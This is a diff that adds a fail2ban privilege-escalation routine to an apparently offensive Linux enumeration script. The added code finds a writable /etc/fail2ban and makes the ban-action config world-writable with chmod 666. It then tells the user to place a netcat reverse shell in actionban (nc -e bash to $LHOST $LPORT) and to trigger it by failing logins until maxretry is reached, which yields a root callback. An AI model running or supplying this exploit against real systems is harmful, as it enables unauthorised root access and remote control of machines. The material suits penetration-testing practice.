@@ -370,6 +370,29 @@ if [ "$(id -u)" = "0" ]; then
 else
 	echo "Not root yet, that sucks, lets keep going"
 fi
+find /etc -writable -ls 2>/dev/null > write.txt
+if grep "/etc/fail2ban" write.txt; then
+	ls -la /etc/fail2ban
+	read -p "Do you have write permissions over folder (y/n):" answer
+	if [ $answer = "y" ]; then
+		cd /etc/fail2ban
+		echo -e '\E[32;40m' "Walkthrough can be found here https://systemweakness.com/privilege-escalation-with-fail2ban-nopasswd-d3a6ee69db49"
+		echo -e '\E[31;40m' "Checking jail.conf"
+		cat /etc/fail2ban/jail.conf
+		cd action.d
+		echo -e '\E[32;40m' "Take note of maxretry"
+		echo -e '\E[31;40m' "Renaming iptables-multiport.conf to iptables-multiport.conf.bak"
+		mv  iptables-multiport.conf iptables-multiport.conf.bak
+		echo -e '\E[31;40m' "Remaking iptables-multiport.conf so you have permissions to it"
+		cp iptables-multiport.conf.bak iptables-multiport.conf
+		chmod 666 iptables-multiport.conf
+		echo -e '\E[31;40m' "Now you need to open iptables-multiport.conf and put a reverse shell in the actionban location (ex: actionban= /usr/bin/nc -e /usr/bin/bash $LHOST $LPORT)"
+		echo -e '\E[32;40m' "After this has been accomplished make sure you start up a listener on your kali machine and fail to login through, this is where maxretry comes into play (ex: if maxretry is 5 you need to fail to login 5 times):"
+		echo -e '\E[31;40m' "Once you have failed to login so many time, you will get a call back from the machine and should be root"
+	else
+		echo -e '\E[31;40m' "Not exploitable with fail2ban exploit, if you want to try manually https://systemweakness.com/privilege-escalation-with-fail2ban-nopasswd-d3a6ee69db49"
+	fi
+fi
 if grep LEGEND lin.txt
 then
 	echo -e '\E[31;40m' "lin.txt already exists not running linpeas"; tput sgr0
